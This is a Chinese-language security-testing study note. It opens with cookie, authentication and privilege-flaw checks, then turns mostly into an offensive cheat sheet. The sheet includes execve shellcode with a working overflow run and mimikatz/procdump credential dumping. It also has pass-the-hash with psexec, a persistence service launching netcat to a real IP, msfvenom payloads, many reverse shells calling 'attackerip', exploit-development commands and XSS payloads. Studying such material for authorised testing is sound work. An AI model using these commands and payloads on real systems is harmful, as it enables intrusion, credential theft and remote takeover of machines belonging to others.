# 安全测试
>* 考察软件系统功能特性中的安全保密性（防止信息被篡改；信息暴露；网站被攻击）

>## Cookie与Session测试
>* 定义：
>  * Cookie(s)：存在客户端的一组txt文件；
>  * Sessions：存在服务器端一组文件；
>* cookie操作
>   * 查看Cookie
>
>### cookie测试
>* Cookie是否起作用
>   * 按照需求或者和Cookie设计相关文档进行插入；Cookie的信息的记录与设计文档一致；
>* Cookie的保存期限
>   * 电商网站（商品）；抖音；新闻资讯
>* Cookie的设置生效
>   * 接受Cookie：全盘接受Cookie：使用网站系统功能表现如何
>   * 阻止Cookie：全盘阻止Cookie：使用网站系统功能表现如何
>   * 提示Cookie：部分接受Cookie：使用网站系统功能表现如何
>* Cookie的信息加密（身份证号；银行卡号；手机号----加密存储处理）
>* Cookie的安全性测试（Httponly；Secure）
>   * Httponly（True）：
>      *  禁止脚本文件访问到cookie信息，对cookie进行修改，防止跨站脚本攻击；
>   * Secure（True）：
>      *  加密传输；
>   * 无法通过人工手段查看，借助工具查看
>      * 开发者工具
>      * 抓包工具（fiddler）

>## 认证授权
>* 注册机制：（密码设定）；
>* 登录：密码隐文显示；在数据库的MD5加密算法；POST传输明文显示；密码次数的限制；登录超时直接断开登录连接；
>* 动态密码；验证码；

>## 暴力破解
>* 尝试1000次用户名和密码的组合；
>* 通过自动化工具去尝试；
>* 防御：
>  * 验证码：图片；动态；拼图---防止机械操作；

>## 越权漏洞
>* 复制URL地址访问，能访问到其他用户或权限才能访问的页面
>*  概念:
>   *  用户执行了不属于自己权限范围内的操作，或者在对数据进行增删改查的时候，访问了不属于自己权限范围内的数据，称为越权。越权漏洞指系统开发过程中未对用户权限做严格校验导致越权的出现。
>*  危害和成因
>   *  危害:
>      *  危害很大，可导致敏感信息泄露、修改关键信息、脱库等，且隐蔽性很高
>   *  产生原因:
>      *  逻辑设计的不合理
>         *  逻辑设计的不合理或者不周密，比如用户可以通过正常途径或者通过简单的操作访问不应该访问的数据等。
>      *  代码校验不全面
>         *  系统在进行权限校验时不够严谨，比如只做客户端校验、加密方式简单、未在每个页面都做过滤等。
>*  漏洞类型
>   *  水平越权
>      *  触发步骤:
>         *  普通用户登录
>         *  将url中的用户名改为其他用户名
>         *  提交请求成功获取信息则为水平越权
>      *  防御方法:
>         *  后端重新校验
>         *  服务端必须做操作权限和数据权限的校验
>         *  每一个页面都必须校验，而不是只在登录的时候做校验
>         *  不能只对用户的类型做权限校验，必须精确到个人，即只能访问个人权限内的数据，且比对参照物必须是登录后服务器端的用户信息
>   *  垂直越权
>      *  触发方法:
>         *  获得只能管理员登录的页面
>         *  用普通用户登录访问只能管理员访问的页面
>         *  成功就是垂直越权
>      *  防御方法:
>         *  服务端必须做操作权限和数据权限的校验
>         *  不要认为界面上看不到的地址用户就不会访问到，每一级别用户可以访问到的界面，都必须针对这一级的用户进行权限校验
>         *  必须对用户的类型做权限校验，建议做一个完善的权限校验框架


>## 缓存溢出漏洞
>* [参考](https://blog.csdn.net/linyt/category_2868109.html)
>### 缓存溢出原理分析
>### 缓存溢出实践
>### 初识shellcode
>### 编写本地shellcode
>#### 如何避免零字节
>* shellcode通常是由于strcpy/sprintf等字符串函数造成溢出，因此通过来注入的shellcode不能出现零字节。但实际运行的代码是需要0的，那如何处理呢？
>* 使用xor指令对寄存器进行清零或者cld，如：
>
>* `xor eax, eax
>xor ebx, ebx
>xor ecx, ecx
>cld     ; `该指令对edx进行清零
>
>* 如果需要将eax的值赋为0x5，不能直接写成mov eax, 0x05，因为它会生成机器码mov eax, 0x00000005，会有0填充。可以采用下面这个技巧：
>
>* `xor eax, eax
>mov al, 0x05`
>
>* X86架上对通用寄存器都提供对应的16位和8寄存，上述例子就是通过它来避免零出现。

>#### 如何知道绝对地址
>* 尽管在前面的攻击例子中，shellcode存放的地址是已知道的，但不同的攻击中，它的地址是会变化的，那么我们如何编写shellcode不依赖了这个变化的地址而通用化呢？ 那么需要借用一些相对跳转指令来获取绝对地址
>
>* call指令是相对转跳，但会在栈上压上绝对地址，然后再弹出就可以获取绝对地址，如：
>
>* jmp short get_string
>* code:
>      pop eax            ; 这里弹出的是call指令压栈的下条指令的地址，即"hello world"字符串的地址
>
>* get_string:
>      call code
>* data:
>* db 'hello world', 0x0a

>* push指令将数据压到栈上，然后获取esp的值，就是刚压栈数据的绝对地址，如：

``push 0x4b435546   ; 0x46, 0x55, 0x43, 0x4b 分别 FUCK字符的 ascii码
mov eax, esp            ; 将"FUCK"字符串首地址赋给eax，后续可用于系统调用传参``

>#### Linux系统调用约定
>* Linux系统调用是以int 0x80指令来陷入内核态的，系统调用号通过eax来传递，参数分别是ebx, ecx, edx, edi, esi来传递。

>#### 编写shellcode
>* 在Linux下编写shellcode，可以直接使用gcc对汇编.S文件进行编译链接，生成标准的可执行ELF文件，同时也能直接进行测试，但有一点不方便是的提取机器码很不方便。
>* 为了方便用提取机器码，使用nasm编译器生成bin格文件，没有任何其它格式数据，方便直接提取。
>* 我们要编写的本地shellcode，对应C 语言逻辑如下
>* `char *argv[2];`
>
>* `argv[0] = "/bin/sh";`
>* `argv[1] = NULL;`
>
>* `execve("/bin/sh", argv, NULL);`
>
>* 翻译成汇编语言过程如下：
>* 将"/bin/sh"字符串压到栈上，包含字符串结串符'\0'
>* `xor edx, edx`
>* `push edx`
>* `push 0x68732f2f`
>* `push 0x6e69622f`
>
>* 将字符串/bin//sh压入栈内，同时通过push edx来保证字符串后面的数所据是0，也即字符串结束符。 请注意，栈是从高地址向低地址生长的，所以要从字符串尾巴压起。
>* `mov ebx, esp`
>* 此时栈底就是字符中址的开始地址，该指令将字符串地址赋给ebx(系统调用的第一个参数）
>
>* 将下来是将argv[2]数组的内容放到栈上。
>* `push edx    ; 将argv[1](值为  NULL) 放到栈上`
>* `push ebx    ; 将argv[0]( "/bin//sh")放到栈上`
>  * 此时esp指向的空间，刚才对应argv[2]数组结构的开始地址
>  * 由于argv是系统调用第二参数，需要将它赋给ecx
>* `mov ecx, esp`
>* `xor eax, eax,`
>* `mov al, 0xb`
>  * 到这时, eax 为 11（系统调用号），ebx为"/bin//sh"字符号（第一参数），ecx为argv数组（第二参数），edx为NULL（第三参数），那就可以直接使用int 0x80进行系统调用了。
>
>* `int 0x80`
>
>* 将上述指令拼在一起就是如下的汇编代码：
>
> BITS 32
> 
> xor edx, edx
> push edx
> push 0x68732f2f
> push 0x6e69622f
>
> mov ebx, esp
>
> push edx
> push ebx
>
> mov ecx, esp
>
> xor eax, eax
> mov al, 0xb
>
> int 0x80


>#### 编译生成机器码
>     nasm -o shell2 shell2.s
>* 生成的shell2文件为bin数据，全是机器码，没有任何格式数据，使用Linux命令转换成bash或者perl可输入的shellcode.
>*     $ od -t x1 shell2 | sed -e 's/[0-7]*//' | sed -e 's/ /\\x/g'\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd
>* 然后使用之前的stack1程序进行测试：
$ echo $$
2503
$ perl -e 'printf "A"x48 . "\x10\xd7\xff\xff" . "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"' > bad.txt;./stack1
data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒1▒Rh//shh/bin▒▒RS▒▒1▒
                                                                              ̀▒▒▒
$ echo $$
4398
>
>* 说明：echo $$命令输出当前shell（即bash或者sh)的pid
>* 前后两次不一样，那就说明 shellcode执行后，打开了一个新shell。 也即shellcode运行成功，测试通过
>#### 编写shellcode测试工具
>#### 绕过地址混淆
>#### 绕过数据执行保护

>## DDOS攻击

>## 安全测试常用命令

>### NMAP 扫描策略
>* 适用所有大小网络最好的 nmap 扫描策略
>
>#### 主机发现，生成存活主机列表
>*     $ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24
>*     $ grep "Status: Up" Discovery.gnmap | cut -f 2 -d ' ' > LiveHosts.txt
>
>#### 端口发现，发现大部分常用端口
>*     http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf
>*     $ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt
>*     $ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt
>*     $ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt
>
>#### 端口发现，发现全部端口，但 UDP 端口的扫描会非常慢
>*     $ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt
>*     $ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt
>
>#### 显示 TCP\UDP 端口
>*     $ grep "open" FullTCP|cut -f 1 -d ' ' | sort -nu | cut -f 1 -d '/' |xargs | sed 's/ /,/g'|awk '{print "T:"> $0}'
>*     $ grep "open" FullUDP|cut -f 1 -d ' ' | sort -nu | cut -f 1 -d '/' |xargs | sed 's/ /,/g'|awk '{print "U:"> $0}'
>
>#### 侦测服务版本
>*     $ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt
>
>#### 扫做系统扫描
>*     $ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt
> 
>#### 系统和服务检测
>*     $ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt
>
>#### Nmap – 躲避防火墙
>##### 分段
>*     $ nmap -f
>##### 修改默认 MTU 大小，但必须为 8 的倍数(8,16,24,32 等等)
>*     $ nmap --mtu 24
>
>##### 生成随机数量的欺骗
>*     $ nmap -D RND:10 [target]
>
>##### 手动指定欺骗使用的 IP
>*     $ nmap -D decoy1,decoy2,decoy3 etc.
>
>##### 僵尸网络扫描, 首先需要找到僵尸网络的IP
>*     $ nmap -sI [Zombie IP] [Target IP]
>
>##### 指定源端口号
>*     $ nmap --source-port 80 IP
> 
>##### 在每个扫描数据包后追加随机数量的数据
>*     $ nmap --data-length 25 IP
> 
>##### MAC 地址欺骗，可以生成不同主机的 MAC 地址
>*     $ nmap --spoof-mac Dell/Apple/3Com IP
>
>#### Nmap 进行 Web 漏洞扫描
>*     cd /usr/share/nmap/scripts/
>*     wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz && tar xzf nmap_nse_vulscan-2.0.tar.gz
>*     nmap -sS -sV --script=vulscan/vulscan.nse target
>*     nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target
>*     nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target
>*     nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target
>*     nmap -sV --script=vuln target
>*     nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target
>* 使用 DIRB 爆破目录
>* 注：DIRB 是一个专门用于爆破目录的工具，在 Kali 中默认已经安装，类似工具还有国外的patator，dirsearch，DirBuster， 国内的御剑等等。
>*     dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt
>* Patator – 全能暴力破解测试工具
>*     git clone https://github.com/lanjelot/patator.git /usr/share/patator
>
>##### SMTP 爆破
>*     $ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst
>*     $ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
>*     $ patator smtp_login host=192.168.17.129 helo='ehlo 192.168.17.128' user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
>*     $ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep='incorrect password or account name'
> 
>##### 使用 Fierce 爆破 DNS
注：Fierce 会检查 DNS 服务器是否允许区域传送。如果允许，就会进行区域传送并通知用户，如果不允许，则可以通过查询 DNS 服务器枚举主机名。类似工具：subDomainsBrute 和 SubBrute 等等
>*     http://ha.ckers.org/fierce/
> $ ./fierce.pl -dns example.com
> $ ./fierce.pl –dns example.com –wordlist myWordList.txt
使用 Nikto 扫描 Web 服务
nikto -C all -h http://IP
扫描 WordPress
git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
./wpscan –url http://IP/ –enumerate p
HTTP 指纹识别
wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
cd httprint_301/linux/
./httprint -h http://IP -s signatures.txt
使用 Skipfish 扫描
注：Skipfish 是一款 Web 应用安全侦查工具，Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图，最终生成的地图会在通过安全检查后输出。
skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
使用 NC 扫描
nc -v -w 1 target -z 1-1000
for i in {101..102}; do nc -vv -n -w 1 192.168.56.> $i 21-25 -z; done
Unicornscan
注：Unicornscan 是一个信息收集和安全审计的工具。
us -H -msf -Iv 192.168.56.101 -p 1-65535
us -H -mU -Iv 192.168.56.101 -p 1-65535
-H 在生成报告阶段解析主机名
-m 扫描类型 (sf - tcp, U - udp)
-Iv - 详细
使用 Xprobe2 识别操作系统指纹
xprobe2 -v -p tcp:80:open IP
枚举 Samba
nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
enum4linux target
枚举 SNMP
snmpget -v 1 -c public IP
snmpwalk -v 1 -c public IP
snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP
实用的 Windows cmd 命令
net localgroup Users
net localgroup Administrators
search dir/s *.doc
system("start cmd.exe /k > $cmd")
sc create microsoft_update binpath="cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe" start= auto error= ignore
/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
Procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32 位系统
C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64 位系统
PuTTY 连接隧道
转发远程端口到目标地址
plink.exe -P 22 -l root -pw "1234" -R 445:127.0.0.1:445 IP
Meterpreter 端口转发
# https://www.offensive-security.com/metasploit-unleashed/portfwd/
# 转发远程端口到目标地址
meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
kali > rdesktop 127.0.0.1:3389
开启 RDP 服务
reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable
关闭 Windows 防火墙
netsh firewall set opmode disable
Meterpreter VNC\RDP
# https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/
run getgui -u admin -p 1234
run vnc -p 5043
使用 Mimikatz
获取 Windows 明文用户名密码
git clone https://github.com/gentilkiwi/mimikatz.git
privilege::debug
sekurlsa::logonPasswords full
获取哈希值
git clone https://github.com/byt3bl33d3r/pth-toolkit
pth-winexe -U hash //IP cmd
或者
apt-get install freerdp-x11
xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP
在或者
meterpreter > run post/windows/gather/hashdump
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
msf exploit(psexec) > exploit
meterpreter > shell
使用 Hashcat 破解密码
hashcat -m 400 -a 0 hash /root/rockyou.txt
使用 NC 抓取 Banner 信息
nc 192.168.0.10 80
GET / HTTP/1.1
Host: 192.168.0.10
User-Agent: Mozilla/4.0
Referrer: www.example.com
<enter>
<enter>
使用 NC 在 Windows 上反弹 shell
c:>nc -Lp 31337 -vv -e cmd.exe
nc 192.168.0.10 31337
c:>nc example.com 80 -e cmd.exe
nc -lp 80
nc -lp 31337 -e /bin/bash
nc 192.168.0.10 31337
nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000
查找 SUID\SGID root 文件
# 查找 SUID root 文件
find / -user root -perm -4000 -print
# 查找 SGID root 文件:
find / -group root -perm -2000 -print
# 查找 SUID 和 SGID 文件:
find / -perm -4000 -o -perm -2000 -print
# 查找不属于任何用户的文件:
find / -nouser -print
# 查找不属于任何用户组的文件:
find / -nogroup -print
# 查找软连接及其指向:
find / -type l -ls
Python shell
python -c 'import pty;pty.spawn("/bin/bash")'
Python\Ruby\PHP HTTP 服务器
python2 -m SimpleHTTPServer
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8888, 
ocumentRoot => Dir.pwd).start"
php -S 0.0.0.0:8888
获取进程对应的 PID
fuser -nv tcp 80
fuser -k -n tcp 80
使用 Hydra 爆破 RDP
hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp
挂载远程 Windows 共享文件夹
smbmount //X.X.X.X/c> $ /mnt/remote/ -o username=user,password=pass,rw
Kali 下编译 Exploit
gcc -m32 -o output32 hello.c (32 位)
gcc -m64 -o output hello.c (64 位)
Kali 下编译 Windows Exploit
wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
wine mingw-get-setup.exe
select mingw32-base
cd /root/.wine/drive_c/windows
wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
cd /root/.wine/drive_c/MinGW/bin
wine gcc -o ability.exe /tmp/exploit.c -lwsock32
wine ability.exe
NASM 命令
注：NASM 全称 The Netwide Assembler，是一款基于80×86和x86-64平台的汇编语言编译程序，其设计初衷是为了实现编译器程序跨平台和模块化的特性。
nasm -f bin -o payload.bin payload.asm
nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload
SSH 穿透
ssh -D 127.0.0.1:1080 -p 22 user@IP
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
proxychains commands target
SSH 穿透从一个网络到另一个网络
ssh -D 127.0.0.1:1080 -p 22 user1@IP1
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
proxychains commands target
使用 metasploit 进行穿透
route add X.X.X.X 255.255.255.0 1
use auxiliary/server/socks4a
run
proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E
或者
# https://www.offensive-security.com/metasploit-unleashed/pivoting/
meterpreter > ipconfig
IP Address  : 10.1.13.3
meterpreter > run autoroute -s 10.1.13.0/24
meterpreter > run autoroute -p
10.1.13.0          255.255.255.0      Session 1
meterpreter > Ctrl+Z
msf auxiliary(tcp) > use exploit/windows/smb/psexec
msf exploit(psexec) > set RHOST 10.1.13.2
msf exploit(psexec) > exploit
meterpreter > ipconfig
IP Address  : 10.1.13.2
基于 CSV 文件查询 Exploit-DB
git clone https://github.com/offensive-security/exploit-database.git
cd exploit-database
./searchsploit –u
./searchsploit apache 2.2
./searchsploit "Linux Kernel"
cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep "<|<=" | sort -k3
MSF Payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> X > system.exe
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 R > exploit.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -a x86 --platform win -f asp -o file.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e x86/shikata_ga_nai -b "\x00" -a x86 --platform win -f c
MSF 生成在 Linux 下反弹的 Meterpreter Shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -f elf -a x86 --platform linux -o shell
MSF 生成反弹 Shell (C Shellcode)
msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b "\x00\x0a\x0d" -a x86 --platform win -f c
MSF 生成反弹 Python Shell
msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
MSF 生成反弹 ASP Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp -a x86 --platform win -o shell.asp
MSF 生成反弹 Bash Shell
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.sh
MSF 生成反弹 PHP Shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.php
add <?php at the beginning
perl -i~ -0777pe's/^/<?php \n/' shell.php
MSF 生成反弹 Win Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -a x86 --platform win -o shell.exe
Linux 常用安全命令
# 使用 uid 查找对应的程序
find / -uid 0 -perm -4000
# 查找哪里拥有写权限
find / -perm -o=w
# 查找名称中包含点和空格的文件
find / -name " " -print
find / -name ".." -print
find / -name ". " -print
find / -name " " -print
# 查找不属于任何人的文件
find / -nouser
# 查找未链接的文件
lsof +L1
# 获取进程打开端口的信息
lsof -i
# 看看 ARP 表中是否有奇怪的东西
arp -a
# 查看所有账户
getent passwd
# 查看所有用户组
getent group
# 列举所有用户的 crontabs
for user in > $(getent passwd|cut -f1 -d:); do echo "### Crontabs for > $user ####"; crontab -u > $user -l; done
# 生成随机密码
cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@#> $%^&*()_+{}|:<>?=’|fold -w 12| head -n 4
# 查找所有不可修改的文件
find . | xargs -I file lsattr -a file 2>/dev/null | grep ‘^….i’
# 使文件不可修改
chattr -i file
Windows 缓冲区溢出利用命令
msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b "\x00" -f c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b "\x00" -f c
COMMONLY USED BAD CHARACTERS:
\x00\x0a\x0d\x20                              For http request
\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)
# 常用命令:
pattern create
pattern offset (EIP Address)
pattern offset (ESP Address)
add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )
!pvefindaddr pattern_create 5000
!pvefindaddr suggest
!pvefindaddr modules
!pvefindaddr nosafeseh
!mona config -set workingfolder C:\Mona\%p
!mona config -get workingfolder
!mona mod
!mona bytearray -b "\x00\x0a"
!mona pc 5000
!mona po EIP
!mona suggest
SEH – 结构化异常处理
注：SEH(“Structured Exception Handling”)，即结构化异常处理，是 windows 操作系统提供给程序设计者的强有力的处理程序错误或异常的武器。
# https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH
# http://baike.baidu.com/view/243131.htm
!mona suggest
!mona nosafeseh
nseh="\xeb\x06\x90\x90" (next seh chain)
iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)
ROP (DEP)
注：ROP(“Return-Oriented Programming”)是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。
DEP(“Data Execution Prevention”)是一套软硬件技术，在内存上严格将代码和数据进行区分，防止数据当做代码执行。
# https://en.wikipedia.org/wiki/Return-oriented_programming
# https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B
# https://en.wikipedia.org/wiki/Data_Execution_Prevention
# http://baike.baidu.com/item/DEP/7694630
!mona modules
!mona ropfunc -m *.dll -cpb "\x00\x09\x0a"
!mona rop -m *.dll -cpb "\x00\x09\x0a" (auto suggest)
ASLR – 地址空间格局随机化
# https://en.wikipedia.org/wiki/Address_space_layout_randomization
# http://baike.baidu.com/view/3862310.htm
!mona noaslr
寻蛋(EGG Hunter)技术
Egg hunting这种技术可以被归为“分级shellcode”，它主要可以支持你用一小段特制的shellcode来找到你的实际的（更大的）shellcode（我们的‘鸡蛋‘），原理就是通过在内存中搜索我们的最终shellcode。换句话说，一段短代码先执行，然后再去寻找真正的shellcode并执行。– 参考自看雪论坛，更多详情可以查阅我在代码注释中增加的链接。
# https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
# http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf
# http://www.fuzzysecurity.com/tutorials/expDev/4.html
!mona jmp -r esp
!mona egg -t lxxl
\xeb\xc4 (jump backward -60)
buff=lxxllxxl+shell
!mona egg -t 'w00t'
GDB Debugger 常用命令
# 设置断点
break *_start
# 执行下一个命令
next
step
n
s
# 继续执行
continue
c
# 数据
checking 'REGISTERS' and 'MEMORY'
# 显示寄存器的值: (Decimal,Binary,Hex)
print /d –> Decimal
print /t –> Binary
print /x –> Hex
O/P :
(gdb) print /d > $eax
> $17 = 13
(gdb) print /t > $eax
> $18 = 1101
(gdb) print /x > $eax
> $19 = 0xd
(gdb)
# 显示特定内存地址的值
command : x/nyz (Examine)
n –> Number of fields to display ==>
y –> Format for output ==> c (character) , d (decimal) , x (Hexadecimal)
z –> Size of field to be displayed ==> b (byte) , h (halfword), w (word 32 Bit)
BASH 反弹 Shell
bash -i >& /dev/tcp/X.X.X.X/443 0>&1
exec /bin/bash 0&0 2>&0
exec /bin/bash 0&0 2>&0
0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/attackerip/4444 cat <&5 | while read line; do > $line 2>&5 >&5; done # or: while read line 0<&5; do > $line 2>&5 >&5; done
exec 5<>/dev/tcp/attackerip/4444
cat <&5 | while read line; do > $line 2>&5 >&5; done # or:
while read line 0<&5; do > $line 2>&5 >&5; done
/bin/bash -i > /dev/tcp/attackerip/8080 0<&1 2>&1
/bin/bash -i > /dev/tcp/X.X.X.X/443 0<&1 2>&1
PERL 反弹 Shell
perl -MIO -e '> $p=fork;exit,if(> $p);> $c=new IO::Socket::INET(PeerAddr,"attackerip:443");STDIN->fdopen(> $c,r);> $~->fdopen(> $c,w);system> $_ while<>;'
# Win 平台
perl -MIO -e '> $c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen(> $c,r);> $~->fdopen(> $c,w);system> $_ while<>;'
perl -e 'use Socket;> $i="10.0.0.1";> $p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(> $p,inet_aton(> $i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};’
RUBY 反弹 Shell
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
# Win 平台
ruby -rsocket -e 'c=TCPSocket.new("attackerip","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
ruby -rsocket -e 'f=TCPSocket.open("attackerip","443").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
PYTHON 反弹 Shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attackerip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
PHP 反弹 Shell
php -r '> $sock=fsockopen("attackerip",443);exec("/bin/sh -i <&3 >&3 2>&3");'
JAVA 反弹 Shell
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/attackerip/443;cat <&5 | while read line; do \> $line 2>&5 >&5; done"] as String[])
p.waitFor()
NETCAT 反弹 Shell
nc -e /bin/sh attackerip 4444
nc -e /bin/sh 192.168.37.10 443
# 如果 -e 参数被禁用，可以尝试以下命令
# mknod backpipe p && nc attackerip 443 0<backpipe | /bin/bash 1>backpipe
/bin/sh | nc attackerip 443
rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4443 0/tmp/
# 如果你安装错了 netcat 的版本，请尝试以下命令
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip >/tmp/f
TELNET 反弹 Shell
# 如果 netcat 不可用或者 /dev/tcp
mknod backpipe p && telnet attackerip 443 0<backpipe | /bin/bash 1>backpipe
XTERM 反弹 Shell
# http://baike.baidu.com/view/418628.htm
# 开启 X 服务器 (:1 – 监听 TCP 端口 6001)
apt-get install xnest
Xnest :1
# 记得授权来自目标 IP 的连接
xterm -display 127.0.0.1:1
# 授权访问
xhost +targetip
# 在目标机器上连接回我们的 X 服务器
xterm -display attackerip:1
/usr/openwin/bin/xterm -display attackerip:1
or
> $ DISPLAY=attackerip:0 xterm
XSS 备忘录
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
("< iframes > src=http://IP:PORT </ iframes >")
<script>document.location=http://IP:PORT</script>
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//–></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
";!–"<XSS>=&amp;amp;{()}
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"">
